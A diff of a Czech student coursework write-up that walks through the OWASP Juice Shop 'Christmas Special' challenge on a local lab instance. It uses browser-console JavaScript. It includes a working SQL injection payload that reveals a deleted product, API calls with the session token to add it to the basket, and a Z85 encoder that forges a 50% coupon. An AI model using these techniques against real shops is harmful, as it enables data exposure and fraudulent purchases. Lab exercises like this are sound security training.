@@ -1,76 +1,111 @@
 # Zápočtové úkoly – OWASP Juice Shop a paleta barev
 
-Vypracováno a ověřeno 23. 10. 2026. Postup je napsaný jednoduše, aby se podle něj dalo cvičení zopakovat.
+Vypracováno a ověřeno 23. 10. 2026. Níže je postup pro zopakování první úlohy přímo ve vývojářské konzoli prohlížeče. Snímky dokládají nalezený produkt, košík, přijatou slevu a dokončenou objednávku.
 
 ## 1. Vánoční speciál 2014 a sleva 50 %
 
 ### Zadání
 
-V OWASP Juice Shopu koupit Vánoční speciál z roku 2014 a použít kupón na 50% slevu pro říjen 2026. Vše jsem dělal v místní cvičné aplikaci na `http://localhost:3000`. Údaje o zákazníkovi, adresa i karta jsou smyšlené; nejde o skutečnou platbu.
+V místním OWASP Juice Shopu koupit Vánoční speciál z roku 2014 a použít kupón na 50% slevu pro říjen 2026. Aplikace běží na `http://localhost:3000`. Údaje o zákazníkovi, adresa i karta jsou smyšlené; jde o místní laboratorní cvičení.
 
-### 1. Příprava účtu
+### 1. Přihlášení a otevření konzole
 
-Nejdřív jsem ověřil, že aplikace běží. Pro tento pokus jsem přes rozhraní `POST /api/Users/` založil samostatný testovací účet `ukol23@example.invalid` a potom se do něj přihlásil v prohlížeči. Při opakování si lze účet založit také přes **Account → Login → Not yet a customer?**. Heslo se do tohoto repozitáře neukládá.
+Otevřu Juice Shop a přihlásím se přes **Account → Login**. Pokud účet nemám, založím si ho přes **Not yet a customer?**. Pro doložený nákup byl použit testovací účet `ukol23@example.invalid`.
+
+Na stránce Juice Shopu stisknu **F12** nebo **Ctrl + Shift + J** a otevřu záložku **Console / Konzole**. Příkazy níže zadávám právě sem, ne do systémového terminálu. Každý blok spustím klávesou Enter a počkám na výsledek.
+
+Konzole umožňuje spouštět JavaScript přímo v otevřené stránce. Funkcí `fetch()` odešlu požadavek do stejné aplikace, ve které jsem přihlášený. `await` počká, než dorazí odpověď. Pokud blok spouštím znovu, proměnné deklarované pomocí `var` lze použít opakovaně.
 
 ### 2. Nalezení skrytého produktu
 
-Obyčejný dotaz `Christmas` na vyhledávacím API vrátil prázdný seznam. Vyzkoušel jsem proto tento vstup:
+Nejprve si vyzkouším obyčejné hledání:
+
+```javascript
+var bezneHledani = await fetch('/rest/products/search?q=Christmas');
+console.log(await bezneHledani.json());
+```
+
+Běžný dotaz v ověřené instanci vrátil prázdné pole `data`. Pro nalezení starého produktu použiji tento vstup:
 
 ```text
 Christmas%'))--
 ```
 
-V terminálu jsem odeslal:
+Do konzole zadám:
 
-```bash
-curl -sG --data-urlencode "q=Christmas%'))--" \
-  http://localhost:3000/rest/products/search
+```javascript
+var hledanyText = "Christmas%'))--";
+var odpovedProduktu = await fetch(
+  '/rest/products/search?q=' + encodeURIComponent(hledanyText)
+);
+if (!odpovedProduktu.ok) throw new Error('Hledání se nepovedlo.');
+var nalezeneProdukty = await odpovedProduktu.json();
+console.table(nalezeneProdukty.data);
 ```
 
-`curl` pošle požadavek na webové rozhraní aplikace. Přepínač `-G` dá parametr do adresy a `--data-urlencode` správně zakóduje zvláštní znaky.
+`encodeURIComponent()` upraví zvláštní znaky tak, aby se daly bezpečně vložit do adresy požadavku. `json()` přečte odpověď serveru a `console.table()` zobrazí produkty přehledně v tabulce.
 
-Jde o SQL injection: vstup se dostane přímo do databázového dotazu. Apostrof a závorky uzavřou původní část dotazu a `--` zakomentuje jeho zbytek, včetně podmínky, která vyřazuje odstraněné zboží. Proto se objeví i starý Vánoční speciál.
-
-V odpovědi jsem našel:
+Jde o SQL injection. Aplikace vloží hledaný text přímo do databázového dotazu. Apostrof a závorky uzavřou jeho původní část a `--` zakomentuje zbytek, včetně podmínky pro vyřazení odstraněného zboží. Díky tomu se v odpovědi objeví i skrytý produkt.
 
 | Údaj | Hodnota |
 | --- | --- |
 | Název | Christmas Super-Surprise-Box (2014 Edition) |
 | ID produktu | `10` |
 | Cena | `29.99` |
-| Stav | Má vyplněné `deletedAt`, tedy je skrytý jako odstraněný produkt. |
+| Stav | Vyplněné `deletedAt`, tedy produkt skrytý jako odstraněný. |
 
-![Odpověď vyhledávacího API se skrytým produktem](screenshots/00-produkt-api.jpg)
+Následující snímek zachycuje odpověď stejného vyhledávacího API otevřenou v prohlížeči. Není to snímek samotné konzole; v konzoli se stejné údaje zobrazí jako tabulka.
 
-V této verzi aplikace zadání stejného vstupu do běžného hledání v prohlížeči stále zobrazovalo „No results found“. Důležitá byla odpověď API. Produkt jsem proto přidal do košíku přímo přes API.
+![Odpověď API s nalezeným Vánočním speciálem](screenshots/00-produkt-api.jpg)
 
-### 3. Přidání produktu do košíku
+V této verzi aplikace běžné vyhledávací pole stále ukazovalo „No results found“. Proto pokračuji požadavkem z konzole.
 
-Pro přístup ke svému košíku jsem se přihlásil také přes `POST /rest/user/login`. Posílá se JSON s položkami `email` a `password`. Odpověď obsahuje `authentication.token` a `authentication.bid`.
+### 3. Přidání produktu do svého košíku
 
-Token je dočasný přihlašovací klíč a `bid` je číslo košíku. Při opakování použiji vlastní hodnoty, například v těchto proměnných:
+Z přihlášené stránky si vezmu token a číslo vlastního košíku. Aplikace je po přihlášení ukládá do úložiště prohlížeče:
 
-```bash
-# Z přihlašovací odpovědi si vezmu svůj token a svoje bid.
-# Zástupné texty níže je nutné nahradit, nejsou to skutečné přihlašovací údaje.
-TOKEN='SEM_PATRI_VLASTNI_TOKEN'
-BID='SEM_PATRI_CISLO_VLASTNIHO_KOSIKU'
+```javascript
+var token = localStorage.getItem('token');
+var cisloKosiku = Number(sessionStorage.getItem('bid'));
 
-curl -s http://localhost:3000/api/BasketItems/ \
-  -H "Authorization: Bearer $TOKEN" \
-  -H 'Content-Type: application/json' \
-  --data "{\"ProductId\":10,\"BasketId\":$BID,\"quantity\":1}"
+if (!token || !Number.isInteger(cisloKosiku) || cisloKosiku <= 0) {
+  throw new Error('Nejdřív se přihlas do Juice Shopu a pak blok spusť znovu.');
+}
 ```
 
-`ProductId` určuje produkt, `BasketId` můj košík a `quantity` počet kusů. Server vrátil HTTP `200`. V prohlížeči jsem otevřel **Your Basket** a ověřil, že je uvnitř jeden Vánoční speciál za `29.99`.
+Token funguje jako dočasný přihlašovací klíč. Není potřeba ho ručně kopírovat ani znovu zadávat heslo. Token nezveřejňuji a nefotím ho do dokumentace.
+
+Potom do stejné konzole zadám:
+
+```javascript
+var pridani = await fetch('/api/BasketItems/', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer ' + token
+  },
+  body: JSON.stringify({
+    ProductId: 10,
+    BasketId: cisloKosiku,
+    quantity: 1
+  })
+});
+
+if (!pridani.ok) {
+  throw new Error('Přidání se nepovedlo: ' + await pridani.text());
+}
+console.log('Produkt byl přidán do košíku.', await pridani.json());
+```
+
+`POST` vytvoří položku košíku. `headers` obsahuje typ dat a přihlášení. `JSON.stringify()` převede zadané údaje na text ve formátu JSON. `ProductId` je číslo produktu, `BasketId` číslo mého košíku a `quantity` počet kusů.
+
+Tento blok spustím **jen jednou**, abych produkt nepřidal opakovaně. Potom otevřu **Your Basket**, případně obnovím stránku. Zkontroluji jeden Vánoční speciál za `29.99`.
 
 ![Vánoční speciál v košíku](screenshots/01-kosik.jpg)
 
-### 4. Zjištění kupónu
+### 4. Vytvoření kupónu v konzoli
 
-Formát kupónu jsem ověřil ve zdrojových souborech běžícího Juice Shopu, konkrétně v `build/lib/insecurity.js` a `build/routes/coupon.js`. Aplikace používá kódování **Z85**, tedy převod textu na jinou textovou podobu. Nejde o šifrování ani o podepsaný kupón.
-
-Text před zakódováním je:
+Juice Shop používá pro tento typ kupónu kódování **Z85**. Je to převod textu do jiné textové podoby, ne šifrování. Formát byl ověřen ve zdrojovém kódu místní aplikace. Pro říjen 2026 a slevu 50 % potřebuji zakódovat:
 
 ```text
 OCT26-50
@@ -80,34 +115,57 @@ OCT26-50
 - `26` znamená rok 2026.
 - `50` znamená slevu 50 %.
 
-Zakódování jsem ověřil přímo knihovnou dostupnou v kontejneru:
+Abych nemusel používat další program nebo webovou stránku, převedu text přímo v konzoli tímto JavaScriptem:
 
-```bash
-docker exec juice-shop /nodejs/bin/node -e \
-  'const z=require("z85"); console.log(z.encode(Buffer.from("OCT26-50")))'
+```javascript
+function zakodujZ85(text) {
+  var abeceda = '0123456789abcdefghijklmnopqrstuvwxyz' +
+    'ABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#';
+  var bajty = new TextEncoder().encode(text);
+  if (bajty.length % 4 !== 0) {
+    throw new Error('Z85 potřebuje počet bajtů dělitelný čtyřmi.');
+  }
+  var vysledek = '';
+  for (var i = 0; i < bajty.length; i += 4) {
+    var cislo = bajty[i] * 16777216 + bajty[i + 1] * 65536 +
+      bajty[i + 2] * 256 + bajty[i + 3];
+    var skupina = '';
+    for (var j = 0; j < 5; j++) {
+      skupina = abeceda[cislo % 85] + skupina;
+      cislo = Math.floor(cislo / 85);
+    }
+    vysledek += skupina;
+  }
+  return vysledek;
+}
+
+var kupon = zakodujZ85('OCT26-50');
+console.log('Kupón na říjen 2026 se slevou 50 %:', kupon);
 ```
 
-Výsledek:
+Funkce zpracovává vždy čtyři bajty textu a převede je na pět znaků Z85. Pro zadání stačí změnit text v posledním volání funkce; zbytek převodu nechám stejný.
+
+Konzole vypíše:
 
 ```text
 pEw8phz3^u
 ```
 
-Tento příkaz počítá s kontejnerem pojmenovaným `juice-shop`, jak je tomu u této instalace. Kupón je určený pro říjen 2026; aplikace kontroluje aktuální měsíc serveru.
+Kupón platí pro říjen 2026. Aplikace porovnává jeho měsíc s aktuálním měsícem serveru.
 
 ### 5. Použití kupónu
 
-Klikl jsem na **Checkout**, přidal smyšlenou adresu a vybral **Standard Delivery** za `0.00`. V části plateb jsem rozbalil **Add a coupon**, zadal `pEw8phz3^u` a klikl na **Redeem**.
+Zavřu nebo zmenším vývojářské nástroje. V košíku kliknu na **Checkout**, vyplním smyšlenou adresu a vyberu **Standard Delivery** za `0.00`. V části plateb rozbalím **Add a coupon**, zadám `pEw8phz3^u` a kliknu na **Redeem**.
 
-Aplikace zobrazila hlášku **Your discount of 50% will be applied during checkout.** Částka na této obrazovce klesla na `14.99`.
+Aplikace potvrdí **Your discount of 50% will be applied during checkout.** Při doloženém nákupu klesla částka na platební obrazovce na `14.99`.
 
-![Aplikace potvrdila 50% slevu](screenshots/02-sleva.jpg)
+![Potvrzení 50% slevy](screenshots/02-sleva.jpg)
 
 ### 6. Dokončení nákupu
 
-Pro místní simulaci jsem přidal testovací kartu `4111111111111111` se jménem **Student Test**. Potom jsem ji vybral, pokračoval na **Proceed to review** a dokončil objednávku tlačítkem **Place your order and pay**.
+Pro místní simulaci přidám testovací kartu `4111111111111111` se jménem **Student Test**. Vyberu ji, kliknu na **Proceed to review** a objednávku dokončím přes **Place your order and pay**.
 
-Zobrazilo se **Thank you for your purchase!** a objednávka číslo:
+Úspěšný nákup poznám podle **Thank you for your purchase!**. Doložená objednávka má číslo:
 
 ```text
 f29b-4a233c121138e735
@@ -115,9 +173,24 @@ f29b-4a233c121138e735
 
 ![Potvrzená objednávka Vánočního speciálu](screenshots/04-potvrzeni.jpg)
 
-**Poznámka k zaokrouhlení:** Platební obrazovka ukazuje `14.99`, ale konečné potvrzení `15.00`. Polovina z `29.99` je `14.995`. Tato verze aplikace částky v různých krocích zaokrouhluje rozdílně. V potvrzení je uvedené zboží za `29.99`, doprava `0.00`, sleva `14.99` a výsledná cena `15.00`. Do postupu jsem zapsal skutečně zobrazené hodnoty.
+**Zaokrouhlení ceny:** Platební obrazovka ukazuje `14.99`, ale konečné potvrzení `15.00`. Polovina z `29.99` je `14.995` a tato verze aplikace zaokrouhluje v různých krocích rozdílně. Potvrzení obsahuje zboží za `29.99`, dopravu `0.00`, slevu `14.99` a výslednou cenu `15.00`.
 
-Objednávku jsem ověřil i přes rozhraní sledování objednávky: obsahuje produkt ID `10`, množství `1` a slevu `14.99`. Úloha **Christmas Special** je označená jako splněná. Byla tak označená už před tímto opakováním, proto důkaz nového nákupu tvoří především nové potvrzení objednávky. Úloha **Forged Coupon** požaduje vyšší slevu; její splnění není součástí tohoto zadání.
+### 7. Kontrola výsledku v konzoli
+
+Po nákupu mohu ve stejné konzoli ověřit obsah objednávky:
+
+```javascript
+// Při vlastním opakování sem doplním číslo své nové objednávky.
+var cisloObjednavky = 'f29b-4a233c121138e735';
+var kontrolaObjednavky = await fetch(
+  '/rest/track-order/' + encodeURIComponent(cisloObjednavky),
+  { headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') } }
+);
+if (!kontrolaObjednavky.ok) throw new Error('Objednávku se nepodařilo načíst.');
+console.log(await kontrolaObjednavky.json());
+```
+
+Ověřená objednávka obsahuje produkt ID `10`, množství `1` a slevu `14.99`. Úloha **Christmas Special** je označená jako splněná. Byla tak označená už před doloženým opakováním; důkaz nového nákupu tvoří nové potvrzení objednávky. Úloha **Forged Coupon** vyžaduje vyšší slevu a není součástí tohoto zadání.
 
 ## 2. Skript pro paletu 16 barev terminálu
 
